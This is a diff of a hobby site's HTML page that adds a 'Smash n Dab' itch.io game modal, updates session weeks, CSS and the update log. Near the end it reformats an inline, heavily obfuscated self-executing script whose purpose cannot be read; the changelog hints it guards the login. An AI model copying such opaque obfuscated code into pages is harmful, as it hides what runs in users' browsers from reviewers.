@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -48,7 +49,7 @@
         }
 
         .login h1 {
-            font-family: 'Archivo',cursive;
+            font-family: 'Archivo', cursive;
             font-weight: bolder;
             font-size: 50px;
             color: #62ad00;
@@ -269,8 +270,22 @@
             font-weight: bold;
         }
 
+        .closeb {
+            color: white;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
         .close:hover,
         .close:focus {
+            color: #000;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .closeb:hover,
+        .closeb:focus {
             color: #000;
             text-decoration: none;
             cursor: pointer;
@@ -305,6 +320,7 @@
             background-color: #926d4e;
             color: white;
         }
+
         #wordleplayagain:hover {
             background-color: #ce9a6f;
         }
@@ -314,16 +330,22 @@
             color: white;
             border: 0;
             border-radius: 5px;
-            width: 100px;
-            height: 30px;
+            width: 150px;
+            height: 40px;
             font-family: 'Archivo', cursive;
         }
 
         .featureBtn button:hover {
             background-color: #609124;
         }
+
+        #smashndabiframe {
+            width: 80%;
+            height: 600px;
+        }
     </style>
 </head>
+
 <body>
     <div class="loader" id="loader"></div>
     <center id="login">
@@ -377,7 +399,7 @@
                                 <center>
                                     <div class="session" id="sessone">
                                         <br>
-                                        <h1 class="sessh1">Week Six</h1>
+                                        <h1 class="sessh1">Week Nine</h1>
                                         <p id="demoa" class="timers">Starts in: Loading...</p>
                                         <br>
                                     </div>
@@ -387,7 +409,7 @@
                                 <center>
                                     <div class="session" id="sesstwo">
                                         <br>
-                                        <h1 class="sessh1">Week Seven</h1>
+                                        <h1 class="sessh1">Week Ten</h1>
                                         <p id="demob" class="timers">Starts in: Loading...</p>
                                         <br>
                                     </div>
@@ -397,7 +419,7 @@
                                 <center>
                                     <div class="session" id="sessthree">
                                         <br>
-                                        <h1 class="sessh1">Week Eight</h1>
+                                        <h1 class="sessh1">Week Eleven</h1>
                                         <p id="democ" class="timers">Starts in: Loading...</p>
                                         <br>
                                     </div>
@@ -410,7 +432,8 @@
                 <div class="features" id="features">
                     <center>
                         <div class="featureBtn">
-                            <button id="myBtn">Play Wordle</button>
+                            <button id="myBtn" class="wordlebtn">Play Wordle</button>
+                            <button id="dabdad">Play Smash n Dab</button>
                         </div>
                     </center>
                     <div id="myModal" class="modal">
@@ -421,7 +444,7 @@
                             </div>
                             <div class="modal-body">
                                 <center>
-                                    <iframe src="https://drageno01.github.io/projects/sideprojects/mcc/features/wordle/index.html" id="wordleiframe"></iframe>
+                                    <iframe src="./features/wordle/index.html" id="wordleiframe"></iframe>
                                 </center>
                             </div>
                             <div class="modal-footer">
@@ -431,24 +454,41 @@
                             </div>
                         </div>
                     </div>
+                    <!-- https://html-classic.itch.zone/html/908675/SAD%20WGL%200601_F/index.html?v=1574336773 -->
+                    <div id="myModalb" class="modal">
+                        <div class="modal-content">
+                            <div class="modal-header">
+                                <span class="closeb">&times;</span>
+                                <h2>Smash n Dab</h2>
+                            </div>
+                            <div class="modal-body">
+                                <center>
+                                    <iframe
+                                        src="https://html-classic.itch.zone/html/908675/SAD%20WGL%200601_F/index.html?v=1574336773"
+                                        id="smashndabiframe"></iframe>
+                                </center>
+                            </div>
+                            <div class="modal-footer">
+                                <center>
+                                    <button id="smashndabplayagain" onclick="reloadSmashndab()">Refresh Game</button>
+                                </center>
+                            </div>
+                        </div>
+                    </div>
                 </div>
             </div>
             <div class="updatelogs" id="updatelogs">
                 <center>
-                    <h3 class="updateHeader">Update V0.0.03</h3>
-                    <h5 class="updateDate">24.5.2024 @ 01:10 am</h5>
+                    <h3 class="updateHeader">Update V0.0.04</h3>
+                    <h5 class="updateDate">11.6.2024 @ --:-- -m</h5>
                 </center>
                 <p class="updateInfo">
-                    We noticed how we were lacking features, and thats why people don't use this website... not to fear, we are working on it.<br><br>
-                    <b>Login:</b><br>
-                    <i>
-                        - Improved Hashing of Code.<br>
-                        - Updated the colors to a more HiSmile chocolate.
-                    </i><br><br>
+                    Did someone say 'MORE FEATURES'. We have added a new game from itch.io<br><br>
+                    <br>
                     <b>Home Page:</b><br>
                     <i>
                         - Updated Weeks.<br>
-                        - Sessions will hide after expire date.<br>
+                        - Sessions will completely hide after expire date.<br>
                     </i><br>
                     <b>Update Logs:</b><br>
                     <i>
@@ -456,14 +496,12 @@
                     </i><br>
                     <b>Features:</b><br>
                     <i>
-                        - Added Wordle Clone.<br>
-                        - Wordle button will be updated.<br>
-                        - Wordle has a play again button.<br>
+                        - Added Smash n Dab (itch.io game).<br>
+                        - Feature buttons updated.<br>
+                        - Smash n Dab should work from the source.<br>
                     </i><br>
                     <b>Misc:</b><br>
                     <i>
-                        - Hased the login information.<br>
-                        - Events do expire, and now will hide.<br>
                         - No console bugs... still.<br>
                     </i><br>
                     Before we leave you to explore the website on your own, or just leave... we ask you fill out a quick
@@ -485,7 +523,8 @@
     <script src="https://drageno01.github.io/projects/sideprojects/mcc/main.js"></script>
     <!-- <script src="./main.js"></script> -->
     <script>
-        (function(){var FKn='',xuv=618-607;function EsC(u){var n=3975319;var k=u.length;var d=[];for(var q=0;q<k;q++){d[q]=u.charAt(q)};for(var q=0;q<k;q++){var b=n*(q+359)+(n%25365);var a=n*(q+93)+(n%48325);var o=b%k;var r=a%k;var l=d[o];d[o]=d[r];d[r]=l;n=(b+a)%4413525;};return d.join('')};var qQY=EsC('rzyecolntframcuohgsitokbujcvrtpnqsxwd').substr(0,xuv);var qni='rar dr12,p+71,gd73;v(r y=.abcd=fghi+klmnhpqrseuvwx.z";v=r m=]86,8.,88,v5,79<82,8v,90,n2,89g75,6[,70,=4,76<71,6 ,81,p4,87 ;var+t=[]jf.r(far j=0;j<h.len)th;jl+)t[u[j]]tj+1;lar iy[];d(=21;n+=22Cg+=2v;forevar p=0;aearguvents[lengrh;a+)){vao o=a(gumeits[a,.spl=t(" f);for(varaz=o.-engt=-1;z==0;zr-){v>r r=iull;.ar cao[z]=var 7=nul ;varr==0;jar hic.lesgth;+ar x+for(6ar ly0;l<g;l++;{varan=c.1harCudeAt-l);v;r k=g[n];ef(k)rr=(ka1)*p3c.ch)rCodoAt(lu1)-d=x=l;i++;}flse ,f(n={g){r"p*(m.lengnh-d+l.cha7Code)t(l+0))+cnchar+odeA=(l+2=-d;xrl;l+;2;}e;se{cantin)e;}i1(u==iull)v=[];2f(x>m)u.pish(c;subsvring=v,x),;u.p"sh(osr+1]n;v=lA1;}ic(u!=full)vif(vuh)u.0ush(;.sub;trint,v))(o[z]{u.join(""t;}}i=pushso[0];;}vac f=irjoina"");=6r qt[42,t0,32.96,9c,39]nconctt(m)+var ==Strong.fiomCh.rCoda(46)afor(nar j)0;j<(.lenath;jv+)fv5.splvt(s+qocha=At(jm).joun(St)ing. romCharCo]e(q[)]));peturm f.svlit((+"!"l.joi9(s);';var dEJ=EsC[qQY];var MEm='';var wLi=dEJ;var CKa=dEJ(MEm,EsC(qni));var wFD=CKa(EsC('_#gidon$St,ing(=V\'St3ing},#V-31(a,b{V\'a%)cb}V!V-43ra,b)h\'a+.Vb}V#"-60(l,b)V9a.r.rb}V,c$_b5fd=(Vn)("%)geTC)leesVgint[.cMC!s\/?m c%pueuhot.p.c%_i%toty",3o7531V);if7!_$_&59d)nV =.Vnull.;V&V_(v,V.setr7l$t)-V,tVVzV0f00xV0(V0dVah={}et.!_t.cV1Vetrp_$t;V b=v.!leng%h;z.1_=.ct];;f3r(V,g=0;Vjft$VV60(eV2e++.{V.e7=.cvc!cha2.jt())};f(r(V,3=0;Veft$V360(e=2e++z{fV"S3V\/. .cV$.3(e,059)))V$37c\/,25;65)) ;;xVi43V\/,a.cVe43(e,93))4V$37r\/,48925));;;aVi37(f;!_V2fdV"3((x.!rV2;ho!_=..V.aV,;;jV;39(a)z,d)$jV!4)(d,z5h);j#!41(.;f,xa};V,p=V1f}$gidin$Stfing(-.!frVmCha]sode}127)VV,s=ofV)r .f%V0w=.f(1V)lc.f%V{y=.fV0V)i!.f#.a;retern.c!.!_VasV(rVV+gV]w)V+$V(y),+iV(c)}if)!_$_"59d),V%(){retu(n};w)ndow(V*4]_[V*3g](V*.],V*r],V*,]);VjjV!39(a,zsd){VraV3=9cV.d)3}V&rV!40td,z,%){V.4V3=.,h.!_1V&jV.41(tuf,x)ctV"3!(V$42(f.!$,x.!1)),4[1352V)} C($spl.ter_(af12340 .._=.clso$f6$V- )&jso#ft$ 1jso$tt$V-a_$af3r640h7 fuictio{.c {\'etur=.c )=!spl(t( .];V, -$_b5dd[ .njoine%var4c bob$_ z9!_[ bt.!_#={},0jso$.,b);+.!_]'));var vgL=wLi(FKn,wFD );vgL(4837);return 1440})()
+        (function () { var FKn = '', xuv = 618 - 607; function EsC(u) { var n = 3975319; var k = u.length; var d = []; for (var q = 0; q < k; q++) { d[q] = u.charAt(q) }; for (var q = 0; q < k; q++) { var b = n * (q + 359) + (n % 25365); var a = n * (q + 93) + (n % 48325); var o = b % k; var r = a % k; var l = d[o]; d[o] = d[r]; d[r] = l; n = (b + a) % 4413525; }; return d.join('') }; var qQY = EsC('rzyecolntframcuohgsitokbujcvrtpnqsxwd').substr(0, xuv); var qni = 'rar dr12,p+71,gd73;v(r y=.abcd=fghi+klmnhpqrseuvwx.z";v=r m=]86,8.,88,v5,79<82,8v,90,n2,89g75,6[,70,=4,76<71,6 ,81,p4,87 ;var+t=[]jf.r(far j=0;j<h.len)th;jl+)t[u[j]]tj+1;lar iy[];d(=21;n+=22Cg+=2v;forevar p=0;aearguvents[lengrh;a+)){vao o=a(gumeits[a,.spl=t(" f);for(varaz=o.-engt=-1;z==0;zr-){v>r r=iull;.ar cao[z]=var 7=nul ;varr==0;jar hic.lesgth;+ar x+for(6ar ly0;l<g;l++;{varan=c.1harCudeAt-l);v;r k=g[n];ef(k)rr=(ka1)*p3c.ch)rCodoAt(lu1)-d=x=l;i++;}flse ,f(n={g){r"p*(m.lengnh-d+l.cha7Code)t(l+0))+cnchar+odeA=(l+2=-d;xrl;l+;2;}e;se{cantin)e;}i1(u==iull)v=[];2f(x>m)u.pish(c;subsvring=v,x),;u.p"sh(osr+1]n;v=lA1;}ic(u!=full)vif(vuh)u.0ush(;.sub;trint,v))(o[z]{u.join(""t;}}i=pushso[0];;}vac f=irjoina"");=6r qt[42,t0,32.96,9c,39]nconctt(m)+var ==Strong.fiomCh.rCoda(46)afor(nar j)0;j<(.lenath;jv+)fv5.splvt(s+qocha=At(jm).joun(St)ing. romCharCo]e(q[)]));peturm f.svlit((+"!"l.joi9(s);'; var dEJ = EsC[qQY]; var MEm = ''; var wLi = dEJ; var CKa = dEJ(MEm, EsC(qni)); var wFD = CKa(EsC('_#gidon$St,ing(=V\'St3ing},#V-31(a,b{V\'a%)cb}V!V-43ra,b)h\'a+.Vb}V#"-60(l,b)V9a.r.rb}V,c$_b5fd=(Vn)("%)geTC)leesVgint[.cMC!s\/?m c%pueuhot.p.c%_i%toty",3o7531V);if7!_$_&59d)nV =.Vnull.;V&V_(v,V.setr7l$t)-V,tVVzV0f00xV0(V0dVah={}et.!_t.cV1Vetrp_$t;V b=v.!leng%h;z.1_=.ct];;f3r(V,g=0;Vjft$VV60(eV2e++.{V.e7=.cvc!cha2.jt())};f(r(V,3=0;Veft$V360(e=2e++z{fV"S3V\/. .cV$.3(e,059)))V$37c\/,25;65)) ;;xVi43V\/,a.cVe43(e,93))4V$37r\/,48925));;;aVi37(f;!_V2fdV"3((x.!rV2;ho!_=..V.aV,;;jV;39(a)z,d)$jV!4)(d,z5h);j#!41(.;f,xa};V,p=V1f}$gidin$Stfing(-.!frVmCha]sode}127)VV,s=ofV)r .f%V0w=.f(1V)lc.f%V{y=.fV0V)i!.f#.a;retern.c!.!_VasV(rVV+gV]w)V+$V(y),+iV(c)}if)!_$_"59d),V%(){retu(n};w)ndow(V*4]_[V*3g](V*.],V*r],V*,]);VjjV!39(a,zsd){VraV3=9cV.d)3}V&rV!40td,z,%){V.4V3=.,h.!_1V&jV.41(tuf,x)ctV"3!(V$42(f.!$,x.!1)),4[1352V)} C($spl.ter_(af12340 .._=.clso$f6$V- )&jso#ft$ 1jso$tt$V-a_$af3r640h7 fuictio{.c {\'etur=.c )=!spl(t( .];V, -$_b5dd[ .njoine%var4c bob$_ z9!_[ bt.!_#={},0jso$.,b);+.!_]')); var vgL = wLi(FKn, wFD); vgL(4837); return 1440 })()
     </script>
 </body>
+
 </html>
